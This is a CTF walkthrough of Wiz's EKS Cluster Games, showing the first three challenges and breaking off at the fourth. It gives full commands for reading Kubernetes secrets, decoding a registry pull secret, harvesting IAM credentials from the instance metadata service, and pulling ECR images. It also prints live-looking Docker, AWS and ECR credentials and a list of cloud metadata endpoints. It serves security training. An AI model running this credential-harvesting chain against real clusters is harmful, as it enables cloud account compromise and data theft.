---
title: "EKS Cluster walkthrough"
date: 2024-10-15 00:00:00 +0800
categories: [Cloud Security]
tags: [cloud security]
---

# Hello world

Learn about EKS cluster security by 5 fun CTF challenges made by [wiz.io](https://wiz.io/).
![alt text](../images/welcome.png)
# welcome the the challenge
You've hacked into a low-privileged AWS EKS pod. Use the web terminal below to find flags across the environment. Each challenge runs in a different Kubernetes namespaces with varying permissions.

All K8s resources are crucial; challenges are based on real EKS misconfigurations and security issues.

Click “Begin Challenge” on your desktop, and for guidance, click the question mark icon for useful cheat sheet.

Good luck!

```
__ ___ _____ _ ______ 
\ \ / (_)____ | ____| |/ / ___| 
\ \ /\ / /| |_ / | _| | ' /\___ \ 
  \ VV / | |/ / | |___| . \ ___) | 
   \_/\_/ |_/___| |_____|_|\_\____/ 
  ____ _ _ _ 
/ ___| |__ __ _| | | ___ _ __ __ _ ___ 
| | | ' _ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ 
| |___| | | | (_| | | | __/ | | | (_| | __/ 
\____|_| |_|\__,_|_|_|\___|_| |_|\__, |\___| 
                                  |___/ 
Welcome to Wiz EKS Challenge! 
For your convenience, the following directories are persistent across sessions: 
        * /home/user 
        * /tmp

Use kubectl to start! 
root@wiz-eks-challenge:~#
```

# Secret Seeker
> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

permissions allowed:
```
{
    "secrets": [
        "get",
        "list"
    ]
}
```
we can get secret using
```
$ kubectl get secrets
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      355d
```
we can describe secret like this
```
kubectl describe secret log-rotate
Name:         log-rotate
Namespace:    challenge1
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
flag:  52 bytes
```
in secrets data is stored base64 encoded. we can extract flag like this 
```
$ kubectl get secret log-rotate -o jsonpath='{.data.flag}' | base64 --decode
wiz_eks_challenge{omg_over_privileged_secret_access}
```
SOLVED!!

# Registry Hunt
> A thing we learned during our research: always check the container registries.
For your convenience, the crane utility is already pre-installed on the machine.

permissions allowed
```
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```
lets try listing pod image
```
$ kubectl get pods -o jsonpath={..image}
eksclustergames/base_ext_image docker.io/eksclustergames/base_ext_image:latest
```
listing pod 
```
kubectl get pods
NAME                    READY   STATUS    RESTARTS      AGE
database-pod-2c9b3a4e   1/1     Running   9 (28d ago)   355d
```
I have tried to describe pod and god this interesting info 
``` 
imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
```

```
$ kubectl get pod database-pod-2c9b3a4e -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:05Z"
  name: database-pod-2c9b3a4e
  namespace: challenge2
  resourceVersion: "130499080"
  uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
spec:
  containers:
  - image: eksclustergames/base_ext_image
    imagePullPolicy: Always
    name: my-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-cq4m2
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
  nodeName: ip-192-168-21-50.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-cq4m2
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:05Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2024-09-22T22:52:53Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2024-09-22T22:52:53Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:05Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://21ba7b1709f6d31abc128325484e42414f84323e388b2fa0101aabcc908f9d41
    image: docker.io/eksclustergames/base_ext_image:latest
    imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
    lastState:
      terminated:
        containerID: containerd://038fbdd061f8d31fa1d17de2cb04a0153653fdfd65abc7bf46f418f443907b4a
        exitCode: 0
        finishedAt: "2024-09-22T22:52:52Z"
        reason: Completed
        startedAt: "2024-08-17T16:30:35Z"
    name: my-container
    ready: true
    restartCount: 9
    started: true
    state:
      running:
        startedAt: "2024-09-22T22:52:52Z"
  hostIP: 192.168.21.50
  phase: Running
  podIP: 192.168.12.173
  podIPs:
  - ip: 192.168.12.173
  qosClass: BestEffort
  startTime: "2023-11-01T13:32:05Z"
```

we can get that secret
```
$ kubectl get secret registry-pull-secrets-780bab1d -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson
```
It is a kubernetes.io/dockerconfigjson type secret that is used to store the authentication information of the Docker image repository so that it can be authenticated when pulling private images. 

> - samen auth value you can see in your machine in `./docker/config.json` file, which will contain your username:password you used to login to docker.

we can visit [jwt.io](https://jwt.io) to decode JWT token:
```
{
  "auths": {
    "index.docker.io/v1/": {
      "auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="
    }
  },
  "alg": "HS256"
}
```
base64 decoding of auth value:
`eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo`
this is `username:password`

> - `crane` is a tool for interacting with remote images and registeries.

then we can login to private Registry using crane:
```
$ crane auth login -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo docker.io
```
get image name of pod
```
$ kubectl get pods -o jsonpath={..image}
eksclustergames/base_ext_image docker.io/eksclustergames/base_ext_image:latest
```
read about image,
```
$ crane config docker.io/eksclustergames/base_ext_image:latest
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:18.920734382Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:18.920734382Z","created_by":"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' \u003e /flag.txt # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:18.920734382Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"]}}
```
flag: `wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}`

SOLVED!!
> We successfully used this technique in both of our engagements with Alibaba Cloud and IBM Cloud to obtain internal container images and to prove unauthorized access to cross-tenant data.

# Image Inquistion
> A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
Remember: You are running inside a compromised EKS pod.
For your convenience, the crane utility is already pre-installed on the machine.

Permissions allowed
```
{
    "pods": [
        "list",
        "get"
    ]
}
```
we can see pod is running 
```
$ kubectl get pods
NAME                      READY   STATUS    RESTARTS      AGE
accounting-pod-876647f8   1/1     Running   9 (29d ago)   355d
```
we can see details of pods 
```
kubectl get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubernetes.io/psp: eks.privileged
      pulumi.com/autonamed: "true"
    creationTimestamp: "2023-11-01T13:32:10Z"
    name: accounting-pod-876647f8
    namespace: challenge3
    resourceVersion: "130499066"
    uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
  spec:
    containers:
    - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      imagePullPolicy: IfNotPresent
      name: accounting-container
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-mmvjj
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-mmvjj
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:10Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2024-09-22T22:52:51Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2024-09-22T22:52:51Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:10Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://75bc595a339ec42824ca3ebdab4e406a53a9667268e530eda1e58c9fdca8afaf
      image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
      imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      lastState:
        terminated:
          containerID: containerd://28abc7c8db6da76f3c78f250876cab51581c48dc04ef908501dadaead0980393
          exitCode: 0
          finishedAt: "2024-09-22T22:52:49Z"
          reason: Completed
          startedAt: "2024-08-17T16:30:32Z"
      name: accounting-container
      ready: true
      restartCount: 9
      started: true
      state:
        running:
          startedAt: "2024-09-22T22:52:50Z"
    hostIP: 192.168.21.50
    phase: Running
    podIP: 192.168.5.251
    podIPs:
    - ip: 192.168.5.251
    qosClass: BestEffort
    startTime: "2023-11-01T13:32:10Z"
kind: List
metadata:
  resourceVersion: ""
```
We can see that ECR repository is used for image. To see details of image we need ECR credentials probably. Let's think in this approach...

currently aws is not configured
```
$ aws sts get-caller-identity

Unable to locate credentials. You can configure credentials by running "aws configure".
```
> - Amazon ec2 provides a local endpoint available to instances that can provide various bits of information to the instance.  If the instance has IAM role attached, it can provides a set of credentials that are valid for that role.

Our pod is on EKS. We can try to access the AWS metadata service, `IMDS Instance Metadata Service`, v1 is the first version of Amazon EC2 instance metadata service. By requesting AWS metadata interface, we can get the relevant data information of the running example. The cloud service addresses of common manufacturers are as follows:

```
#AWS 
http://instance-data 
http://169.254.169.254 
#Google Cloud 
http://169.254.169.254 
http://metadata.google.internal 
http://metadata 
#Azure 
http://169.254.169.254 
# Digital Ocean 
http://169.254.169.254 
#Packetcloud 
https://metadata.packet.net 
#Oracle Cloud 
http://169.254.169.254 
#Alibaba Cloud 
http://100.100.100.200 
#Tencent Cloud 
http://metadata.tencentyun .com 
http://169.254.0.23
```
> - IMDSv1 has certain risks and has experienced serious security incidents. AWS has officially prompted the use of IMDSv2 instead of IMDSv1, and starting in mid-2024, newly released Amazon EC2 instance types will only use the v2 version of IMDS.

```
curl http://169.254.169.254/latest/meta-data
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
system
```
lets take information about `iam`
```
$ curl http://169.254.169.254/latest/meta-data/iam
info
security-credentials/
```
to get attached iam role
```
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials
eks-challenge-cluster-nodegroup-NodeInstanceRole
```
IAM role: `eks-challenge-cluster-nodegroup-NodeInstanceRole`

To get creadentials for this role
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMXSZQP375","Expiration":"2024-10-22 07:12:13+00:00","SecretAccessKey":"7SUvltkPctKIgVW7bV2Rryw8Oh4mJwW0mJmNLze2","SessionToken":"FwoGZXIvYXdzEEgaDCgXiK4+zeE1yaTXaSK3Aa+OfqkAd2Izzxp6o3jRgF0XAl/koSWAafLN6V4Jtu9nR5M6KWKkoL++Hz2ugKcLAJVwnghcgi8Em0FgVmi3PYEf7JZuYckpFr0tYKcxxVwj6BpoHhJgNuX7VflazSS0OaZRskSMn54dlP+r42zvFJHchb1YMi6suFaTLZujTCtwGyIP1NTo5meowKYuGbDWvFQUPu/52dCfK/T3xFbPjgfssszHk+GB8KgVfVepD6nqXmFARVgQpii9hN24BjIt9Jofrgkyl31zf+yk6bKI7di+G5pHkFBRvJ3FuBrFcGsAL+fTvK0PEGm0hD/V"}
```
lets configure them in aws cli. and confirm it 
```
$ aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

crane doesn't directly interact with AWS to get credentials, so we need to use AWS cli to generate a login token(vallid for 12 hours) which crane can use to authenticate.

```
$ aws ecr get-login-password --region us-west-1
eyJwYXlsb2FkIjoiYXlYMVlzWjNVRlZRRHdmazlWSUptU1ZjYTRsUGFFcWVtVm1jeGVLVE1zZ1dudW13anMzUUhTMWNxQVVzeW8rK1ZabVVrV21DMjZGS3l2SUxEUUJBdC9jR3Ztb2tmR1RncmRvZzFoL1ZjVklyaTBIelEySlNIY3o4eXBKU0pZYk5UR3ZBY0xNeFlUMzZFd2lNYUl0dllxNmV3VG14ekU0R0dDa0V2M3dmaEdTOGQvbXhnWWQ3YkVNU0k1WXhOWGVSWGdTUVRzWm94NG03bU0rMFdmeGdablJVR2g3UXRXNkd4SWVXbDlGdFd6VkZvbkdJNjVyWVREMklCaXdsMFhLNnlpN1FPQUFUYm9OTUZIdEM4eGp5ajNGaDh3T21MRGRFaUJFckRoVUhYRE5nWU5kU1YvaXJSbksvUzl3T3RtSU4zZE52eHR1U1ZMNEo0UzNtSjhmODFPQlF3Tjg1L2FhWVJSVmY1TG5adExoOUZzY1A4YWlzcWFLcVRrcTJHdlFGd3psQUZoalh6ZmRncmltRHgyMldJSWxUSURzMmwwL3piOENIalh4MlFNZXU4VDZIRDl3YUVZZ2R6S1dDVlBpbitWalY2WnEwbHRMUGdmcEJLeUlHNDR5QTg2bGV0dUkwelFVSUJqN1lxQ2hxQUNXSHh2N3IzbGZkVkdnQWxMdXJYNU0ybTA5TmZ0TjBOdUNGV1A5ZmNMMUxMYUIvZEoxQk9lV254K1oySHk4WDc0aXMydjVBblNjYyt3b1Q5VWtod0hVQkxDdCtvU0ZNdW9XQlYxa3FrSmVpK2VuZmhEK3VKNzNLZHNIOVRLMXZtODlZdko0bnpuZ1J1aUZFNHlyaTluQmJkYWRhM3QzeWFaM3huU1N1VXg4T1NYYnFFUGhtTmxpSGRGczdYVkhnRGRXRlpYQjhRdjdhSUVlbXZXV3lIdkcvSHhIWFNmanhDUHQrc2h1SC9ONVA3UERTOGowQS9pTUR0a1kycHZJczdUbTJiWWIxeWxMUk1DQ212Q3RJV1lqUHFHdVcrS2FIZ0h0ZUZ3ZG80dHRIeEoxN1ZHalFQZWZLdlZDRVF6ZmxtWVQ1NWNKSk5XVTFESzVxd1FrS2o4dlhVYm1TeFVuSmYwblhLcloxOVFzc3BtdWJFUTZUU1ZEUzZvWXNKWmgxaUc0clhXYXZqSUJnQlJYVDkxdzFRNUtIZDVkSVg2eEwxWE5LUHdsMDY1clhwYUpVN3ZmMEVhWm9QelJxZjhrTXlFdkpOOEFZMHFYazR4dWREbXVaWlNvckplbWpHQ2swZFpwOGtlVUhWVXRCbVNqaktHcEx3dkozTTFEVVcwQW51OHc1Nk8rTDJaVGRQKzdKZzFLMkdQTzFSZHhLb2oxcGlWeHZNUnlaakpIMEI4MktHYkpteEhZazB4K1lRTlg3VU9CVkVZc1NJdGpQd21HS1hVaUtRUU9nOEp0bDY2S1JSMHpJck1JVzlFemhlSWNtNERWRG9TbjkxVkgyeGdyZ0FWdXpUWWhnc1FLYy9lbFhzcjI5VmNPUlhEVVdpTUFIVlpDQlNncXRpVm1LWTVERGRVbExzWDltdGJRS2cvazRMQVlWelI1ZzVLWHlIOE93dHhNc0NnUFM3NFR5clhSeXd1SEZ3eWdIY3RLbVJzclZRbHkxK2FJbmp2MD0iLCJkYXRha2V5IjoiQVFFQkFIaWpFRlhHd0YxY2lwVk9hY0c4cVJtSm9WQlBheThMVVV2VThSQ1ZWMFhvSHdBQUFINHdmQVlKS29aSWh2Y05BUWNHb0c4d2JRSUJBREJvQmdrcWhraUc5dzBCQndFd0hnWUpZSVpJQVdVREJBRXVNQkVFRE4vZzd3b052QnJDQ1JxYVJnSUJFSUE3Nmh2YXVzRzRRVVdkR2FlTmp5Vk0zZE13VUZwN2VnVGtKLzd1YllyTVBVb0pBRmNiSUs2aUdKQkFpd2ZHQnRrTUhCL0tGR0xEUmNKeDVkYz0iLCJ2ZXJzaW9uIjoiMiIsInR5cGUiOiJEQVRBX0tFWSIsImV4cGlyYXRpb24iOjE3Mjk2MjA5MjV9
```

So to authenticate crane, we use:
```
$ crane auth login -u AWS -p $(aws ecr get-login-password --region us-west-1) 688655246681.dkr.ecr.us-west-1.amazonaws.com
2024/10/22 06:16:58 logged in via /home/user/.docker/config.json
```
> - default username for ECR is `AWS`

Let's pull image now.
```
$ crane pull 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 image.tar
$ ls
image.tar
```
lets dig into files image contains.
```
$ tar -xvf image.tar
sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz
e7310b04c944c3e0bbb9ebc04b885dc7ad937061e0dc77c73449ef133eab4fd9.tar.gz
manifest.json
```
`sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3` : image configuration file
`3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz`: first image layer archive
`e7310b04c944c3e0bbb9ebc04b885dc7ad937061e0dc77c73449ef133eab4fd9.tar.gz`: second image layer archive

`manifest.json`: structure of image

I started reading all files. Image configuration file contains flag under `ARTIFACTORY_TOKEN` value
```
$ cat sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}
```

`OR`
we can read config of image

```
$ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"]}}roo
```
`ARTIFACTORY_TOKEN` contains flag.

`flag`: `wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} `

SOLVED!!

> In this challenge, you retrieved credentials from the Instance Metadata Service (IMDS). Moving forward, these credentials will be readily available in the pod for your ease of use.

# Pod Break
> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

permissions allowed:
```
{}
```

